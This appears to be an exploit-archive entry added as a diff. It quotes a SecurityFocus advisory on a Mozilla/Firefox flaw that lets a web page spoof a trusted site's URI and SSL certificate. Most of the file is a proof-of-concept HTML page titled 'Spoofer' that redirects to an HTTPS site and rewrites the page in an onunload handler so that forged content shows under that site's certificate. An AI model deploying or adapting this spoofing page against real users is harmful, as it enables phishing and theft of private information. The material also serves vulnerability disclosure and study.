@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/10796/info
+
+Mozilla and Firefox may permit malicious Web pages to spoof security properties of a trusted site.
+
+An attacker can exploit this issue to spoof the URI and SSL certificate of a site trusted by an unsuspecting user. The attacker can then use this spoofing to steal sensitive or private information, facilitating phishing attacks
+
+< HTML>
+< HEAD>
+< TITLE>Spoofer< /TITLE>
+< META HTTP-EQUIV="REFRESH" CONTENT="0;URL=https://www.example.com">
+< /HEAD>
+< BODY
+onunload="
+document.close();
+document.writeln('< body onload=document.close();break;>
+< h3>It is Great to Use example's Cert!');
+
+document.close();
+window.location.reload();
+">
+< /body>
